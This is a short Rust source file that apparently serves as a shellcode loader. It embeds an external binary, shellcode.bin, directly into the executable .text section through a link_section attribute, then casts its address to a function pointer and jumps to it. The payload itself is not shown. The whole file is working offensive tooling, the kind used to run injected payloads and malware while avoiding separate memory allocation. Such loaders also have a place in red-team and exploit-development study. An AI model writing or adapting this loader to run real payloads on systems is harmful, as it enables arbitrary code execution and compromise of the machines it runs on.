use std::mem;


//we do this trick because otherwise only the reference to the buffer will end up in .text section
const SHELLCODE_BYTES: &[u8] = include_bytes!("../../shellcode.bin");
const SHELLCODE_LEN: usize = SHELLCODE_BYTES.len();

#[no_mangle]
#[link_section = ".text"]
static SHELLCODE: [u8; SHELLCODE_LEN] = *include_bytes!("../../shellcode.bin");

fn main() {
    let exec_shell: extern "C" fn() -> ! = unsafe {mem::transmute(&SHELLCODE as *const _ as *const ())};
    exec_shell();
}
